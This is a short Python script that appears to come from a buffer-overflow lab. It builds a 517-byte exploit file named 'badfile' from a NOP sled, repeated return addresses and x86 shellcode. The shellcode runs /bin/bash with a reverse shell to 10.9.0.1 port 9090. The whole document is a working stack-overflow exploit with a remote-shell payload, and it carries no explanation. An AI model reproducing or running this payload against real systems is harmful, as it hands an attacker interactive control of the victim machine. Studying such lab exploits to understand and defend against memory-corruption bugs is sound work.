#!/usr/bin/python3
import sys

shellcode= (
    "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
    "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
    "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
).encode('latin-1')

content = bytearray(0x90 for i in range(517)) 

EBP    = 0xffffd108 + 300

for i in range(0, 200, 4):  # 200 = 50 * 4
    content[i:i + 4] = (EBP).to_bytes(4, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
